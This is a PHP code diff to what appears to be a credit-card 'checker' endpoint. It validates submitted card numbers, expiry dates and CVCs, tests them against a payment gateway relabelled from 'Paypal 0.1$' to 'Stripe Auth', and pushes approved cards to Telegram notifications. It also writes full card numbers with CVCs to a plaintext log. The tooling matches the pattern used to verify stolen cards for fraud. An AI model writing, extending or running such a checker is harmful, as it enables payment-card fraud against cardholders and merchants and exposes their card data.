@@ -149,7 +149,7 @@ session_start([
 if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Forbidden Access', 'response' => 'Forbidden Access'];
-    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 403: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
+    log_message('Error 401: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
 }
@@ -159,7 +159,7 @@ if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegra
 if (!$validation['valid']) {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
-    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
+    log_message('Error 401: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
 }
@@ -169,7 +169,7 @@ if (!$validation['valid']) {
 if ($providedApiKey !== $expectedApiKey) {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
-    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
+    log_message('Error 401: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
 }
@@ -177,13 +177,6 @@ if ($providedApiKey !== $expectedApiKey) {
 // Enable error reporting for debugging (disable in production)
 ini_set('display_errors', 0);
 error_reporting(E_ALL);
-
-// Optional file-based logging for debugging
- $log_file = __DIR__ . '/paypal0.1$_debug.log';
-function log_message($message) {
-    global $log_file;
-    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
-}
 
 // Track sent notifications to prevent duplicates
  $sent_notifications = [];
@@ -254,7 +247,7 @@ function sendTelegramNotification($card_details, $status, $response, $originalAp
     $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
     $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
     $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
-    $gateway = 'Paypal 0.1$'; // Hardcoded for this gateway
+    $gateway = 'Stripe Auth'; // Updated for this gateway
     $formatted_response = formatResponse($response);
 
     // Construct Telegram message
@@ -299,14 +292,6 @@ if (!isset($_POST['card']) || !is_array($_POST['card'])) {
     exit;
 }
 
-
-
-header('Content-Type: text/plain');
-
-// Enable error reporting for debugging (remove in production)
-ini_set('display_errors', 0);
-error_reporting(E_ALL);
-
 // Function to check a single card via API
 function checkCard($card_number, $exp_month, $exp_year, $cvc) {
     // Prepare card details for API and display
@@ -332,13 +317,15 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc) {
 
     // Handle API errors
     if ($response === false || $http_code !== 200 || !empty($curl_error)) {
-        return "DECLINED [API request failed: $curl_error (HTTP $http_code)] $card_details";
+        log_message("API request failed: $curl_error (HTTP $http_code) for $card_details");
+        return ['status' => 'DECLINED', 'message' => "API request failed: $curl_error (HTTP $http_code)"];
     }
 
     // Parse JSON response
     $result = json_decode($response, true);
     if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'], $result['response'])) {
-        return "DECLINED [Invalid API response: " . substr($response, 0, 100) . "] $card_details";
+        log_message("Invalid API response: " . substr($response, 0, 100) . " for $card_details");
+        return ['status' => 'DECLINED', 'message' => "Invalid API response: " . substr($response, 0, 100)];
     }
 
     $status = strtoupper($result['status']);
@@ -347,23 +334,39 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc) {
     // Check if response contains "Succeeded" (case-insensitive)
     $is_succeeded = stripos($response_msg, 'Succeeded') !== false;
     
-    // Output based on status
+    // Determine our status based on API response
+    $our_status = 'DECLINED';
+    $our_message = $response_msg;
+    
     if ($status === "APPROVED" || $is_succeeded) {
         // If it's a "Succeeded" response, change the message
         if ($is_succeeded) {
-            return "[Payment Method added successfully.]";
+            $our_status = 'APPROVED';
+            $our_message = 'Payment Method added successfully.';
+        } else {
+            $our_status = 'APPROVED';
         }
-        return "[$response_msg]";
     } elseif ($status === "DECLINED") {
-        return "[$response_msg]";
+        $our_status = 'DECLINED';
     } else {
-        return "DECLINED [Unknown status: $status]";
+        $our_status = 'DECLINED';
+        $our_message = "Unknown status: $status";
     }
+    
+    log_message("$our_status for $card_details: $our_message");
+    
+    // Send Telegram notification for APPROVED status
+    if ($our_status === 'APPROVED') {
+        sendTelegramNotification($card_details, $our_status, $our_message, $response);
+    }
+    
+    return ['status' => $our_status, 'message' => $our_message];
 }
 
 // Check if the request is POST and contains card data
 if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card']) || !is_array($_POST['card'])) {
-    echo "DECLINED [Invalid request or missing card data]";
+    log_message("Invalid request or missing card data");
+    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid request or missing card data']);
     exit;
 }
 
@@ -373,7 +376,8 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card']) || !is_array
 // Validate card data
 foreach ($required_fields as $field) {
     if (empty($card[$field])) {
-        echo "DECLINED [Missing $field]";
+        log_message("Missing $field");
+        echo json_encode(['status' => 'ERROR', 'message' => "Missing $field"]);
         exit;
     }
 }
@@ -387,7 +391,8 @@ foreach ($required_fields as $field) {
 // Normalize exp_month to 2 digits
  $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
 if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
-    echo "DECLINED [Invalid exp_month format]";
+    log_message("Invalid exp_month format: $exp_month_raw");
+    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid exp_month format']);
     exit;
 }
 
@@ -400,21 +405,25 @@ if (strlen($exp_year_raw) == 2) {
 } elseif (strlen($exp_year_raw) == 4) {
     $exp_year = (int) $exp_year_raw;
 } else {
-    echo "DECLINED [Invalid exp_year format - must be YY or YYYY]";
+    log_message("Invalid exp_year format: $exp_year_raw");
+    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid exp_year format - must be YY or YYYY']);
     exit;
 }
 
 // Basic validation
 if (!preg_match('/^\d{13,19}$/', $card_number)) {
-    echo "DECLINED [Invalid card number format]";
+    log_message("Invalid card number format: $card_number");
+    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid card number format']);
     exit;
 }
 if (!preg_match('/^\d{4}$/', (string) $exp_year)) {
-    echo "DECLINED [Invalid exp_year format after normalization]";
+    log_message("Invalid exp_year format after normalization: $exp_year");
+    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid exp_year format after normalization']);
     exit;
 }
 if (!preg_match('/^\d{3,4}$/', $cvc)) {
-    echo "DECLINED [Invalid CVC format]";
+    log_message("Invalid CVC format: $cvc");
+    echo json_encode(['status' => 'ERROR', 'message' => 'Invalid CVC format']);
     exit;
 }
 
@@ -422,9 +431,12 @@ if (!preg_match('/^\d{3,4}$/', $cvc)) {
  $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
  $current_timestamp = strtotime('first day of this month');
 if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
-    echo "DECLINED [Card expired]";
+    log_message("Card expired: $card_number|$exp_month|$exp_year|$cvc");
+    echo json_encode(['status' => 'ERROR', 'message' => 'Card expired']);
     exit;
 }
 
-// Check single card
-echo checkCard($card_number, $exp_month, $exp_year, $cvc);
+// Check single card and output JSON response
+ $result = checkCard($card_number, $exp_month, $exp_year, $cvc);
+echo json_encode($result);
+?>
